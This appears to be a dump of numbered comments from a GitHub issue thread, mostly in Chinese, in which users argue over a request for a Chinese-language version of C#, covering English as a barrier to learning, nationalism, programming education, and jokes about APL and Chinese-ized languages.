我想说的是：　我也不想让中国人就这麽奇怪．　为啥我们要种族自大呢？　为啥团团成天鼓吹外国威胁？　为啥中国博士会把＂中国年轻人喜欢性生活＂说成是＂外国腐朽文化入侵的结果？＂
我们不能再这样－－　用我们的话来说就是　ｎｃ　下去了．
有要不懂中文的人创造　Ｃｈｉｎｅｓｅ＃　的功夫，　你不如去Ｐｉｗｉｋ和ＯｐｅｎＳｔｒｅｅｔＭａｐ那里把ＵｓｅｒＣｏｕｎｔｒｙＭａｐ，　Ｍａｐ的台湾问题搞好．　这才是真正的中国人．
Ｒｕｂｙ是日本人设计开发的．　Ｐｙｔｈｏｎ是荷兰人开发的．你可能应该去看看．

中文和英文的差别，　不止在几个词上面．　你那样翻译，　使按键次数更多，　代码更难看．甚至造成 结束文件 和 EOF(文件结束?) 的混淆.　

>　你和他们一样，你觉得自己会了，其它不会的人，会不会都无所谓，因为事不关己高高挂起。何不食肉糜。

＂你选择道路时，　道路也在选择你＂　你觉得什么东西自己不付出是能学好的吗？ 自己不学锅在学科不好的身上?
有些人想学，　但他们会比别人学得更加困难，这往往不是看不懂那些别人能理解的标示符里的含义（我只有初三的英文水平，　为啥我和任何信息技术有关的对象都能谈笑风生？~~当然我的英语理解能力是很强的，　但重要的是要学，　作为开发者理解的能力很重要~~），　而是逻辑／其它需要的知识就有问题．　你自己可能学不好，　于是你把锅背到＂英文编程＂上．　如果你学不会就是因为你看不懂标示符的含义，　你自己毫无问题，　很好．　这很戒色吧．　这很民科．

> 对吧？和开头长文表达的重点，你一个都没去了解，你只是凑热闹，依据自己一厢情愿的解读来看待此次引起的争议罢了。

正解．
这样的垃圾，　我居然凑热闹看完了．　还了解了许多国人自创程序设计语言．　我就是典型看戏的中国人，　为一个人拿中文的Ｔｉｔｌｅ在Ｃ＃语言设计区发的ｉｓｓｅｕｓ＂汉语编程＂　招喷喝彩　你创造了 M$ 开源项目的一个奇迹．　才几天就快　２００＋　Ｃｏｍｍｅｎｔｓ了．

>　还有你对代码中文化的过度丑化，汉字的过度丑化，我也不想多说什么，明眼人能看出。

你能美化成什么样子？　中文和英文语序上就有差异．　这差异使得中文在正常表达时就没有基本固定的格式，　设计，　解析起来难上加难．　像你那样翻译？　恐怕不能实现你的＂降低了门槛和成本＂构想．　因为这样蹩脚的表达天朝的汉语专家都无法理解．

我们作为中国人可以自大的以为我们的语言文字拿来做什么都绝对优雅，　１００％好用，　１００％超过拉丁系，　大天朝无须于外界通有无．　不管什么界都学中文算了．"
2468	"这位同志您好，

我国的信息化现代化大业，绝对不能任由国外大公司独占。假如我国的信息产业受到微软开发出的“中国脸洋人心”语言垄断，不但会阻碍产业发展，而且还会威胁国家机密。《[国际歌](https://zh.wikipedia.org/wiki/%E5%9B%BD%E9%99%85%E6%AD%8C#.E6.B3.95.E8.AF.AD.E7.AC.AC.E4.B8.89.E3.80.81.E5.9B.9B.E3.80.81.E4.BA.94.E7.B5.84.E6.AD.8C.E8.A9.9E)》（L'Internationale）有言，“要创造人类的幸福，全靠我们自己”（Producteurs…commun）。这句话的意思是说，与其在这里低三下四地向外国“救世主”（sauveurs）请愿，还不如联合伟大的码工码农（travailleurs）创造大家的编程语言。只有使用自己开发的编程语言，才能夺回劳动的果实、让思想冲破牢笼啊。

要摆脱帝国主义的影响，除了自己制作编程语言之外，更重要的是要把旧世界打个落花流水（Du passé, faisons table rase）、改变自己的编程理念。C# 这种编程范式本身就不适合中文，最适合汉化的还是 APL 这类微妙、简短、精巧的语言（[bhuztez 2015](https://zhuanlan.zhihu.com/p/19936493)）。C# 之于 APL，就如阁下写出的小学生白话文之于文言文。

> Though the Chinese should adore APL, it's FORTRAN they put their money on.
>&mdash; Alan J. Perlis
>
>APL is the Classical Chinese of programming languages.
>&mdash; [Ben Lynn](http://crypto.stanford.edu/~blynn/c/apl.html)

为中华民族崛起而奋斗！
克林贡帝国驻星联大使馆

<details>
<summary>中华民族崛起步骤</summary>
世界中心在华夏，华夏正音在嘉绒。
九州语言皆胡音，唯我嘉绒最正宗。
蚩尤余众未屠尽，戎狄血统污关东。
东夷不会复辅音，简化声母坏体统。
语法屈折全丢弃，低等语言堪嘲讽。
萨满仓颉鬼画符，字如蛇爬真难用。
自古语言无声调，平仄六朝浮艳风。
鲜卑索虏陆法言，一本《切韵》贻害重。
汉赋唐诗与宋词，胡韵狗屁也不通。
五代十国元金清，汉儿早与胡儿同。
天朝又推普通话，夷上加胡真癫疯。
中原亦敢号汉语？皆是胡化鴃舌众。
闽粤亦敢称正音？蛮语令人把腹捧。
南北千年习鞑语，正音遗忘早不懂。
试问正音在何处？在我川西大山中。
语音千年不曾变，世世代代传无穷。
先祖遗响恒铭记，汉藏古风永尊崇。
世界中心在华夏，华夏正音在嘉绒。
在！嘉！绒！
</details>

* * *
@leave01 我的朋友啊，你到这里不演戏，真的是想让人狠狠踢你的屁股了！我对老天爷发誓，一样丢一条邮件提醒的脸，我还不如去写一串很长的狗屁！"
2469	丟國人的臉
2470	"> 从来就没有什么救世主，也不靠神仙皇帝。要创造人类的幸福，全靠我们自己。

我觉得你应该给易语言官方提 issue。又不是没有，干嘛非得新创建一个。"
2471	"@wizardforcel （江泽民喝水表情）易语言使用的是西方的编程范式，是修正主义、改良主义、渐进主义的毒瘤。劳动人民的编程语言只有基于 APL，才能将旧世界打个落花流水。至于用来实现 APL 的平台，让资本家把吊死他们的绳子卖给我们就可以了。

@pigfromChina 虽然说 Perl YuYan 是中文编程语言很重要的一步，但是还是受到历史局限性的影响，在范式上的创新做得不够多。BrainFuck 过于原始，表现力远远不足 APL 系，不能满足发展生产力、实现“全自动豪华百合太空共产主义”（FALGSC）的需求。另外膜蛤这样的个人崇拜千千万万不能有。哦还有，那个眼镜框的 SVG 是我描的。我没描好，有些地方棱角很明显。

@unixzii It should be obvious that most requests for and marketing of such Chinese-ized languages are based on ethno-linguistic-political arguments. For instance, E, the Very Chinese Visual Basic, is more than eager to boast its ""independent intellectual property"", despite it being merely a Chinese translation of something western. (They removed the MSVC linker dependency, I hope?) Who is to blame for bringing in those things given the initial request? Little other than ""do it yourself"" and The Grand Old Scheme of Aliases is left in this field to argue for, so why not deflect this whole thing to changing the paradigm while mocking this sort of argument using Something Bigger?"
2472	"@Artoria2e5 思想江化, 小心被拉入[膜蛤主义](https://angry.im)漩涡
你们可能不认识[Perl Yu Yan](https://metacpan.org/pod/Lingua::Sinica::PerlYuYan)和BrainFuck...Bf就八个操作符, 多高大上啊?
感谢这里有个没意义的issue让我能在M$的地盘谈笑风声
```perl
   use Lingua::Sinica::PerlYuYan;
 
      用籌兮用嚴。井涸兮無礙
    。印曰最高矣  又道數然哉。
    。截起吾純風  賦小入大合。
    。習予吾陣地  並二至純風。
    。當起段賦取  加陣地合始。
    。陣地賦篩始  繫繫此雜段。
    。終陣地兮印  正道次標哉。
    。輸空接段點  列終註泰來。
```"
2473	A technical discussion is already hoisted to cultural and politics argument, do you think that is suitable in such place? Won't you feel guilty to involve so many people to watch your silly and unreasonable requirement? You kind of people will only make the community full of disorder and mess. What a shame huh. And I decide to report you now.
2474	不就是汉化一下c#么 怎么了  
2475	"@fyyxgame
Good question. If you think that's as easy as pie, do it yourself, because it is an extremely minority feature requirement. And if you can give out a sufficient reason to make community accept your suggestion, then we can be silenced."
2476	"@fyyxgame 
if he want one he should make one himself, but he puts forward this issue & asks people to do it for him even if they have no obligations to do what he want. he's ruining the whole community."
2477	置顶了，有效果了。
2478	"@unixzii  @bctnry    我已经在做了，而且说实话这种需求 并不是少数人吧！某些弄这些编程的论坛人数达到80多万 我想这个比某些国家的人口都多 ！ 另外我没觉得这样不好啊！语言么 不就是想表达意思让更多的人看的懂么？原谅我 中学都没上完 不能用英语回答你们 只能用 百度翻译一下你们的意思!下面的图片仅仅是证明我在做! ide以及语言都是我自己设计的!
![ddddd](https://user-images.githubusercontent.com/32810154/31596016-2c0f756e-b272-11e7-9cb6-05a716c4d212.gif)
![duandiantiaoshi](https://user-images.githubusercontent.com/32810154/31596020-345dd152-b272-11e7-9d9d-c7e98f9333e0.png)
![frffffff](https://user-images.githubusercontent.com/32810154/31596028-4998abe6-b272-11e7-9535-3254310edf52.gif)

"
2479	"@fyyxgame 
**THIS IS NOT THE FLIPPIN' PLACE FOR YOU TO TALK ABOUT THOSE FLIPPIN' CHINESE PROGRAMMING LANGUAGES. THIS AIN'T A MATTER ABOUT WHETHER WE SHOULD FLIPPIN' HAVE ONE, IT'S A MATTER ABOUT WHETHER YOU SHOULD FLIPPIN' TALK ABOUT THEM IN A FLIPPIN' PLACE WHERE YOU FLIPPIN' SHOULDN'T TALK ABOUT THEM**"
2480	@bctnry  难道这是你的地方么？
2481	@fyyxgame **IT AIN'T FLIPPIN' YOURS AS WELL**
2482	"@pigfromChina 
> 所以说我们的 PL 工作者还要学习一个，马克思主义宇宙化的那一套理论。你们有一个好，跑得比恩维尔·霍查还快，但批判一番起来就 too simple，啊，sometimes naïve。那美国的 Zihan Chen，不知道比你们高到哪里去了， @Artoria2e5 和她谈笑风生！你们啊，naïve！我不是 PL 工作者，但我 parse 得太多啦！我有必要告诉你一点嘉绒语的经验！

>> 编程正统在函数
函数正统在 Idris
不 [SE](https://en.wikipedia.org/wiki/Side_effect_(computer_science))，不 [HM](https://en.wikipedia.org/wiki/Hindley%E2%80%93Milner_type_system)，不拒证明，亦不偏向证明
主席守严格求值，书记死代码生成。

> 汉化 F# 也要按照 G**hub 的规范啊，要按照 MIT 的 Licence……当然我们的决定权也是很重要的，F# 语言是属于 FSF，国际自由码工联合会的 F# Software Foundation 的！到时候我们会钦定的！"
2483	"@fyyxgame 
You're right and well done. I admire you for what you have done. And I think you are not the kind of person who only have a mouth to talk, that's too cheap. But what I have to point out is: the value of a programming language is not measured by how many people are using it. If one PL can produce influential productions and be loved by most people, that's a good PL. But such ""Chinese Programming Language"" seems like not working for most of us. I'm sorry but that's the **TRUTH**. You can make great Chinese PL and just keep doing it."
2484	"""编程主要的困难是英语等西方自然语言""??? 我觉得这个前提是完全不对的。绝大多数编程语言的关键字不会有几个，编程的主要困难从来都不是这个。 仅仅是关键字的翻译并不能降低多少学习成本。甚至有的时候还需要学习一下近义词中标准写法是哪个，比如Image.create，同样也可能需要学习是用“图像.新建”，“图形.新建”，“图像.创建”，”图形.创建“等等等等。

熟悉一个语言的关键词不过几天。对学习编程语言来说，入门的是学习编程的语法，这和用什么语言的关键字无关。而变成最主要的困难在于思想，算法之类的，这些更是高于编程语言本身。

我们这一代人小时候学编程的时候，大多还不会英语（英语到中学才开始学）。也没有人会觉得那几个关键字是个问题。

单对中文来说，相对于用中文的关键字来编程，我觉得能解决大多数人语言障碍的是丰富中文的程序生态圈，新的技术新的思想能及时有中文的资料可翻阅。举个例子，前端的VueJS，因为作者本身是中国人，就有一个很完善的中文生态圈。而如AngularJS，国内用的人少，中文的资料就相对比较少，普通人学起来就可能有障碍
"
2485	"用中文书写的语言已经存在了，并且是图灵完备的。LZ 可以在此基础上创建高级中文编程语言：
https://code.google.com/archive/p/grass-mud-horse/"
2486	"this Guy Just a Big Joke !
pls Close this issue."
2487	"I think github issues need a report button.
Close this issue plz,it's a big joke and the qwas982 is not a programmer."
2488	"别闹了，楼主说
编程
大数据
人工智能
机械自动化
可惜你连这些东西的基本理论都不懂，你把所有的不懂的原因都归到英文不行上，是你自己太弱了，别闹了好嘛"
2489	"不是所有人，都对英文理解很深；
也不见得为了编程，就得掌握一种语言，生活中用不着的语言；
我编程不得不学英文，是因为没有支持中文又发展良好的编程语言，不是我真的想学英文；
我们有着成熟中文编程语言的需求，中华儿女应该都有同样的需求，这是十亿人口为基数的需求；
@qwas982我赞同你，是因为一个国家，中国---世界五分之一人口大国，这是一个很大的市场，这个市场没有成熟的人人可用的编程语言，这是一个处女地，真心希望有能力的企业来做这块儿需求，而且，中国也需要这样的编程语言，落后就要挨打啊！"
2490	Nothing to preview, Close this issue.
2491	"@lcawen 
How absurd you thought. You meant everyone should participate in programming? Please **SHOW YOUR RESPECT** for programming!!"
2492	"@lcawen 打过=>大国？
同意全民编程的观点，不过随着基础教育的普及，英文对于大多数人不是问题。"
2493	@lcawe. 这样的说法还是比较中肯的，在这里瞎攻击的人，真的不能理解。可读性是基本要求，连单词都不认识上哪里谈可读性，中文编程可能可读也不好，但总比不认识要好，何况就是用英语编程，母语也是英文的人也不一定能看懂编程语言里的词汇。现在编程是全民需求，中文编程也许不是你们专业的程序员的需求，却是我们这些业余从业者的迫切需求，也是各个其他行业从业者的需求。
2494	这里的中国程序员有多少人，具有其他方面的专业知识，例如: 医学的，建筑的，制造的金融的...。你只具备编程方面的知识怎么能写好各个相关专业的软件。难道你们都写通用软件。实际看看国内的企业应用的现状就知道了，中国的程序员都是职业程序员，其他方面的知识相当匮乏。
2495	"@unixzii There's nothing wrong with everyone learning to code a bit. Many parts of China already teach kids to use Visual Basic 6. Why not go for something better?

Teaching kids about things does not make the things in question worse. You won't say Math education is about paying no respect to the field of Mathematics, will you?"
2496	"@qwas982 
1，在中国,想要学习编程但又不会英语的人有很多。**（现在小学生都会英语了，大哥，别误导歪果仁啊）**
2，并且,因为受到政府的高压统治和信息封锁,普通的大众并没有机会和精力研究程序设计和程序语言. 编程对普通中国人来说是一件遥远的事. **（这就更瞎说了，高压统治，信息封锁，你怎么解释中国这几年的互联网发展和众多的程序员是怎么来的？别什么都牵涉政治好不好，我都怀疑你醉翁之意不在酒了。）**"
2497	"@lcawen @htwx 
真是服你们了.
自己不努力学反而说是因为看不懂造成的.
那我就告诉你们残酷的现实吧:
__现在义务教育是要求你有足够程序设计用的英文学习水平的__
不要以为有""中文""PL了你们就能学会, ~~去做什么多了不起的事情~~
给你们看看, 看看最基础的证实你有这个能力的程序你[Scratch](https://scratch.mit.edu/projects/editor/?tip_bar=getStarted)写不写得出来:
```
从1到100
如果这个数能被3整除, 让小猫说 ""Fizz""
如果这个数能被5整除, 让小猫说 ""Buzz""
如果它既能被3整除, 又能被5整除, 让小猫说 ""FizzBuzz""
```
写不出来就关了这issue吧, 上面那么多中文的项目你们也不是不能参加设计."
2498	赶紧关了，这个无聊的Issue了吧，提出这种Issue的人，我看用心不良。
2499	上面就有我的项目，不怕你笑以前我给MS写过不少类似的意见，但没有反馈。他们不做哪我就自己搞。现在也基本成型了
2500	"@RobotJiang 

>>在中国,想要学习编程但又不会英语的人有很多。
>
>现在小学生都会英语了，大哥，别误导歪果仁啊

很多人学什么语言出来都是靠背过考试，从这个意义上说“不会”没有什么错。抱怨 if then switch case 太多的人英语不及格的也没那么多，主要还是因为死记头疼。至于是教育问题还是语言问题，嘿。

>> 并且,因为受到政府的高压统治和信息封锁,普通的大众并没有机会和精力研究程序设计和程序语言. 编程对普通中国人来说是一件遥远的事. 
> 
> 这就更瞎说了，高压统治，信息封锁，你怎么解释中国这几年的互联网发展和众多的程序员是怎么来的？别什么都牵涉政治好不好，我都怀疑你醉翁之意不在酒了。

计划生育、重男轻女，你怎么解释中国这几年的人口增长和短缺的住房资源？别什么都牵涉政治好不好，我都怀疑你没想过你现在用的这个网站有没有被干掉过了。

> 赶紧关了，这个无聊的Issue了吧，提出这种Issue的人，我看用心不良。

:/"
2501	我本人是建筑专业的，在我们行业的软件都各有各的不足，包括 CAD或国产的天正等等，工程管理软件就更别说了，至于BIM也差不多。
2502	不是我笑话你们，你们的英语水平不一定比楼主好。中国是从小学就开始学英文，但是能用英文交流的有多少
2503	"@htwx 请问您用的这是小号吗?
为啥我只看见了一个没更过新的TypeScript fork 而没有看见您的 ""项目"" 呢? 它们不开源吗?
而且我好像还看到了一个有趣的事:
![别人的issue格式](https://screenshots.firefoxusercontent.com/images/eadfdb70-6a4d-4850-9a2f-5d39375e1f2e.png)
![htwx同学的](https://screenshots.firefoxusercontent.com/images/99918d58-54f5-4d34-ba23-6d77e368cd99.png)"
2504	"@Artoria2e5 今天真好有时间呢，不然我真是懒得理你们这种什么都不知道靠意淫生活的年轻人。因为我真的比你们大很多。
1，说什么靠死记硬背，死记硬背和这个扯得上什么关系吗？我只是在说小学生英文都很溜了，好不好，如果你不知道，你就不能去了解一下现在小学一年级都学英语吗。你们这些小孩子都不关心现在的社会吗？现在很多小学就有编程课了，外面更是有很多机会可以学习编程，懂吗？很多人不去学，那是他们不喜欢啊，难道每个人都应该喜欢编程才成？
2，计划生育怎么了？和这个也有关系？重男轻女是你们家如此，还是都是这么干的？和这个讨论的也能扯上关系？住房资源短缺，你为什么不去学习一下中国经济学？推荐你一本书，温铁军的八次危机。

最后给你们一个建议，不要人云亦云。"
2505	"There is nothing wrong with nationwide programming. Since you're so desired, I tell you something more practical. Just translating keywords or symbols to Chinese is useless, if you really want people to understand programs, why not start with refactoring syntax? Compare code snippets below:
```csharp
class A
{
    public int Number;
}
```

and

```
创建一个名为 A 的类，其中包含名为“数字”的整型。
```

This is the final goal of a Chinese PL. Just think about why Apple created **Apple Script**, because even other languages used English, but their syntax is still obscure, there is still too much symbols and terms that are hard for beginners to understand.

If you agree with me, then this issue should be closed, cuz that's a whole new PL."
2506	"@htwx 编程不需要英文多好，只需要认得基本的关键字就行了，浙江省已经把编程纳入高考范围，证明只要经过义务教育就有能力掌握基本的编程技能，如果只是单纯为了义务教育都没上完的同学开发中文编程语言，意义不是很明显。
我是92年的，我小学的时候已经在学logo语言了，学校开的计算机课，那时还在用3.5英寸软盘呢，编程真的跟语言是不是英语关系不大。"
2507	编程就需要认识几个关键字就行这是什么理论，你那样说难道认识关键字就能读懂程序么？现在基本所以得软件都有本地化的需求，编程语言也就是个特殊的软件。
2508	"@htwx @lcawen 
首先, 我也是个孩子. 我现在也不过是高一学生~~虽然前天决定退学了~~. 应试教育就是这样的. 你能怎么样?
我中考的信息技术就是学校(市里数一数二的)帮助舞弊.  _玩电脑_ 得不到重视. 更多人拿数学把计算机科学比下去了( _数学能取代计算机科学吗? 计算机科学就是数学的附属品吗?_ ).
> 基础的编程，不正是解决现今教育弊端的一种手段吗？可，中国孩子，普遍没有这个条件啊！

如果你想实现上面你的理论. 你或许应该推荐[Scratch](https://scratch.mit.edu). 或者像Turtle这样的东西. 外国普遍用这些. Scratch是有国内社区(贴吧)的, 而且有中文本地化. 这才是大部分不至于想当程序员的人应该尝试的东西.

![screenshot of scratch website](https://screenshots.firefoxusercontent.com/images/e0675a79-978d-42e0-9638-cc6fdb135622.png)"
2509	让我想到了易语言
2510	"论述的大前提都出问题了。什么叫缺少中文编程语言阻碍了发展？难道不是缺少高质量的中文资料阻碍了发展？编程语言中文化有何显而易见的益处？
再则，如果没有相应的刻苦学习的觉悟（无论是英语还是数学），也并不见得适合这行，那也无从谈起所谓的“阻碍发展”"
2511	中文编程 也不单单是 指设计一款中文编程语言，翻译现有的英文资料、官方文档等等对中文编程的贡献更大。关键是这样做的人也不多。
2512	"@lcawen 如果说你认为是应试教育导致的问题，
那么在应试教育体制下，“中文编程”解决问题吗？
1) 如果不考，那么“中文编程”会有人学吗？
2) 如果考，那无非是死记硬背程序代码而已，不管所用的程序语言的关键字和符号名称是来自什么自然语言，和你所说的某些县城学习英文的方式以及如以上诸位所举例的部分地区的会考要求考 VB6 又有什么区别呢？

换言之，如果哪天领导要求高考中增加[“阿拉伯语编程”](https://github.com/nasser/---)，大家还不是得学？

不讳言，我毕业于北京一所中等职业学校的计算机网络技术专业，每天学习的内容是各种路由器交换机的命令。我们这一群连高中都考不上的学生，哪怕是一个字母一个字母地记那些 Cisco IOS 的命令，也都学会了。到最后，全班只有一两个没有通过相应资格考试的。

当然，如果中文编程（此处没有引号）说的不是“把关键字都换成中文”，而是真的用中文的语法来写程序，那么所谓英文编程也是不存在的，哪怕是 AppleScript。关于自然语言编程不可行的原因，可以参阅1972年图灵奖得主艾兹赫尔·韦伯·戴克斯特拉教授生前口述的文章 _[On the foolishness of ""natural language programming""](https://www.cs.utexas.edu/users/EWD/transcriptions/EWD06xx/EWD667.html)_

@htwx 翻译现有的英文资料、官方文档这种事情绝对是有利于社区的，任何人只要去做，社区都 100% 欢迎。
翻译的人其实也不少，只是架不住文档太多了。不信的话你可以去翻译下《C# 语言规范》。（友情提示：ECMA-334:2006 去掉封面、目录、前言、介绍啥的以后差不多530页吧）"
2513	"我觉得，对编程阻碍最大的是，编程在基础教育中的缺失。

只要编程进入基础教育，学校就是最大的中文社区，资料也不成问题，课外班自然会帮着弄，你说呢？

我们时间有限，只能做一件事。那我们就选这个最核心的事情，做完这个，其它的都迎刃而解。

以上。"
2514	C#语言规范 4.0 我就读过 ，TypeScript 的语言规范我也读过，我是铁杆微软粉。但是 微软Windows可以出中文版，C#为什么 不能？说什么有碍交流，对于程序语言这种结构化的文档来说翻译成任何语言都不是问题。自然语言都能翻译了何况这种结构化的文档 就C# 和 .net 来说实现英文到其他语言的翻译没有任何技术难度，对于微软来说。这里给他提意见，希望他们能出一个中文版的C#或者万国语言的C#绝对是对微软的C#不足的一个补充，会使整个工具得到更好的推广。就像在中国用 英文版 Windows的人有，但用中文版的更多一样。但前提是多种语言之间能无缝的转换这个是微软应该解决的问题。现在光光是提供一个中文语言包的注释是远远不够的，何况核心内容连中文版的注释都没有。
2515	"There were the ideas. People all around the word used their own languages to write C by macro definition, which seems like local language version of C. Then things messed up.
What the developers all around the world need is a standard that we could communicate. Not a Chinese local internet like what GFW did."
2516	"@misaka4e21 

1.  你忽略了普高生源质量比职高好的多。如果让普高的学生来学，会好很多。

2.  你可能不知道，c# 编程指南和语言参考，以及 .net  标准库参考都有中文版的。这些东西加起来我估计绝对 10 万页了。500 多页的语言规范算啥，只是没市场没人翻译罢了。"
2517	"@RobotJiang 

> 天真好有时间呢，不然我真是懒得理你们这种什么都不知道靠意淫生活的年轻人。因为我真的比你们大很多。

哎，老天爷真是不开眼。

> 我只是在说小学生英文都很溜了，好不好，如果你不知道，你就不能去了解一下现在小学一年级都学英语吗。

我也是小学英语除了背课文之外比较溜上来的人，您老甭瞎操心这个。问题是我认识的好学生，英语和数学（带很简单的集合论——算是会一点逻辑了吧？）再好，初中遇到写代码还是头疼——这不是死记是啥？既然我已经告诉你是初中义务教育的内容了，第一点的其余部分我忽略不看。

> 计划生育……重男轻女

这句话的逻辑是跟着你“条件 A、条件 B，我怎么就见着相反的趋势 C”的节奏说的。为什么人口增长少了还是人多了呢？因为人口还是在增长啊。你们小部分人用的网络服务再怎样搞，这个现代化和经济增长的趋势也还在啊。更不要说国内 IT 业的增长在一定程度上还受了不可说之屏障提供垄断机会的好处呢。

> 最后给你们一个建议，不要人云亦云。

这句话还给你。祝您身体健康，再见。"
2518	"@htwx 
> 但是 微软Windows可以出中文版，C#为什么 不能？

firefox, [KDE](https://kde.org)都有i18n, 为什么现在所有能在GitHub上找到名目的语言都没有语法上的""i18n""?"
2519	[ChTypeScript](https://gitee.com/HTWX/CHTypeScript) 这个是我以微软的TypeScript项目为基础实践的中文 ts。为了写这个东西我看了C#的编译器代码，C#的语言规范。实现中文的C# 难度不大但是实现中文的.net 是很麻烦的相对于个人来说。微软开源ts 和 vsc后我写了这个 ChTypeScript，这个可以实现现有 js 或 ts lib文件的快速汉化就相当于解决了 .net 的汉化问题。
2520	"@pigfromChina 说起来 GCC 其实是可以有错误和诊断信息的中文翻译，但是……超！级！多！字！符！串！啊！

* * *
\*national anthem intensifies\*

我们程序员：

1. 要始终代表中国先进社会生产力的发展要求；
2. 要始终代表中国先进文化的前进方向；
3. 要始终代表中国最广大人民的根本利益。

(@htwx)"
2521	"@Artoria2e5 
就是不知道为啥LLVM还没有翻译 😕 "
2522	"@Lellansin

But it's a shame to use macros to make localization in China. Even using Pinyin as var's name is not supposed.

I think it's a deep-rooted bad thought. If a code is not designed to be read by foreigners, Pinyin is surely OK. "
2523	@pigfromChina 因为微软没有认识到这个是一个比较广阔的市场。或者说微软的产品开发思路有问题，说明不了其他的。就说这个 github 虽说没有本地化但是 不也有这么多中国人在这里用汉语交流？中国的一个买票软件不一样把他搞宕机
2524	@pigfromChina 同样因为没有市场。国内编译十分小众。
2525	没市场的说法是哪里来的？这里的所谓程序员能代表全部中国人么 ？这个C#不但要出中文版的，还应该出多国语言版的。世界上以英语为母语的才多少人，还有西班牙语，德语，日语，俄语，法语就当时英语吧。
2526	"@htwx 
在这里. 如果不是这个issue以中文写title. 我不会用中文写comment.
我们要和国际接轨. 不要鼓吹中国人任何学问灭天灭地.
荷兰人的Python, 日本人的Ruby. 都是""英文编程语言"".
你有没有想过为啥Ruby不是日语?
为啥就中国(伪)PL研究者喜欢去搞""中文编程""然后拿出来大肆鼓吹?
为啥https://github.com/nasser/--- 明显是给阿拉伯人写的, 还要用英文写README和issue?
做一个谦卑, 能发扬我们优秀传统文化, 有国家意识的中国人.
广阔的市场, 你为啥不去试试Scratch? 不能符合需求?"
2527	关键是你能写出和世界接轨的东西，阿里、腾讯、百度人家和世界接轨是有必要的，你写个破个人网页和谁接轨去。有多少人能和世界接上轨？你想去接轨人家和你接么？还有这么用英语就是和世界接轨了？世界上的语言多了光谷歌的即时翻译都支持多少种了？难道和世界接轨就是和美国接轨？人家正在美国优先呢。
2528	希望微软能实现的是一份代码你想看中文的就看中文的你想看英文的瞬间就可以无缝变成英文的。自然语言都能即时翻译了，结构化文档做不到？如果微软实现了这些功能对C#的推广一定会更有好处。所以说在这里讨论这个问题是非常必要的。
2529	">https://github.com/shadowsocks/shadowsocks-windows/issues/293#issuecomment-132253168

那是自然的咯。这边加了什么功能，它马上扒过去合并了。它那边加了什么却不会贡献出来给其他人用，久而久之，不就是它那边功能更多了吗。

一直以来我什么都没说是因为我对他还有点希望，所以得给他一点面子不是。一开始我还只是纳闷他为什么不发 pull request，过了一段时间我才明白，这个世界上也有这一类的人。不尊重 GPL 就算了，把作者名字换成自己的，还在主页上加上官方的字样。为什么我们这边反而不说官方呢？因为我希望这个项目是没有官方的，人人都是贡献者。想不到这个社会人人都围着官转，人人都巴不得当官 。

既然他没有尊重别人劳动成果的意愿，那他那些不开源的理由想必也只是借口。说因为加了一些试验性功能会不兼容所以暂不开源。他弄了一个混淆 TCP 协议头功能，在界面上标注提升安全性，吸引用户打开，然后安装他自己的不兼容服务端。然而我分析了一下之后发现这个功能的设计就是想当然，用得多了以后反而会增加特征。如果你真有什么试验性功能，不是更应该开放出来让所有人帮你分析么，大家一起讨论么？在加密算法领域，只有经过足够多人和机构的审视的算法，才能视作是安全的，闭门造出来的怎么能用。。

当然啦，大部分用户才不会管这些，他们不会分析你是不是真的安全，也不会做道德判断，只要他们觉得好用就行。所以可以看到，这种环境下开源其实并没有什么优势，只不过为一些人抄袭提供了便利。这种环境下最后留下来的都是这些人。

_我一直想象的那种大家一起来维护一个项目的景象始终没有出现，也没有出现的迹象。维护这个项目的过程中，遇到 @chenshaoju 这样主动分享的同学并不多。很多来汇报问题的人是以一种小白求大大解决问题，解决完就走人的方式来的，然而既不愿提供足够的信息，也不愿写一些自己尝试的过程供后人参考。互帮互助的气氛就是搞不起来。对比下国外的社区差好远。_

__最适合这个民族的其实是一群小白围着大大转，大大通过小白的夸奖获得自我满足，然后小白的吃喝拉撒都包给大大解决的模式。通过这个项目我感觉我已经彻底认识到这个民族的前面为什么会有一堵墙了。没有墙哪来的大大。所以到处都是什么附件回帖可见，等级多少用户组可见，一个论坛一个大大供小白跪舔，不需要政府造墙，网民也会自发造墙。这尼玛连做个翻墙软件都要造墙，真是令人叹为观止。这是一个造了几千年墙的保守的农耕民族，缺乏对别人的基本尊重，不愿意分享，喜欢遮遮掩掩，喜欢小圈子抱团，大概这些传统是改不掉了吧。__

现在维护这些项目已经越来越让我感到无趣。我还是努力工作，好好养家，早日肉翻吧。"
2530	Yeah @wizardforcel , the problem I mean is that NOT DESIGN FOR FOREIGNERS. It just like the Great Fire Wall in China or Berlin Wall in history.
2531	@Artoria2e5  这些者有关系么。智商是问题，不要把别人想成自己。
2532	"做為一個程序員,做了十幾年,我覺得這樣做意義不大.
程序中的英文,並不多,真正做的熟練了完全不會構成什麼問題. 其次,輸入法方面造成了很大困擾,實際用中文編程,反正我是覺得會很慢的. 最後,程序開發的圈子本來就是以英語溝通為主的. 你這裡弄一個中文開發自娛自樂並沒有什麼用,積極學習英語才是出路,什麼時候中國程序員足夠強了再考慮推廣中文編程的問題吧! 
如果僅僅是為了給普通人普及編程,那麼就不需要C#這種了. 適合初學者的語言和開發方式很多,前面有人都舉例字了.圖形編程什麼的不是比中文更簡單直白?  
程序開發目前我們面臨的問題和80年代科學界很類似,我們不能被英語這個門檻給絆倒了,別因為這個就關起門來打算自己搞套東西出來. 這樣沒用,只會和別人差距越來越大. 想弄出世界領先的東西,你先要知道目前世界領先的東西都是什麼吧?
心態開放,積極學習英語,多多了解世界才是正確的路啊!

再加一句,我認為翻譯文檔更有價值一些.
還有,相比起圍觀群眾,真正動手做翻譯的總歸更值得讚揚,這點毋庸置疑. 只是覺得花力氣在這個項目上有些可惜了.性價比不高. 花費的經歷和獲得的正面作用不太高而已.
沒什麼好吵的,做自己喜歡做的事兒,做自己認為有意義的事兒.  總比做圍觀群眾要有價值,值得讚揚!
這也是我對自己昨天過於簡單發言的補充."
2533	"We writing code because we need a language for human reading, not for computer. That's why we have program language.
English is still widely used language around the world. We share our code for all, that's why GitHub created.
You already learnt English so much in compulsory education. In fact, the hard work of programming isn't English, is the thoughts about how to communicate to computer."
2534	"@htwx 不知道你问的是哪个。

语言规范的话，你思考一下，为什么大家愿意翻译 api 参考，都不愿意翻译语言规范。

编译的话，你看看国内大学的cs，有多少人搞理论cs、形式语言、plt。"
2535	路过。。。不要拉低民族智商下限
2536	自己民族的语言都不想用，你还能算这个民族的人么？低不低智商和你没什么关系。
2537	"我认为汉语编程是一项很值得研究的课题。

